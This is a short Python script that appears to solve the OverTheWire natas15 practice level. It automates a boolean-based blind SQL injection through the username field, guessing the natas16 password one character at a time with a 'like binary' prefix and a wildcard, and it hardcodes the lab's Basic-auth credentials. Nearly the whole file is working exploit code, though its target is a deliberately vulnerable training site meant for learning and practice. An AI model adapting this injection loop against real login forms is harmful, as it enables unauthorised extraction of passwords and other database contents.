import requests

chars = "0ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789"
password = "WaIHEacj63wnNIBROHeqi3p9t"
Url = "http://natas15.natas.labs.overthewire.org/index.php"
Basic_User = "natas15"
Basic_Pass = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

while len(password) <= 32 :
    for char in chars:
        print("testing: " +char)
        resp = requests.post(Url,data={"username":'natas16" and password like binary "'
        + password + char + '%%" -- '},auth=(Basic_User,Basic_Pass))
        if "This user exists" in resp.text :
            password += char 
            print(password)
            break
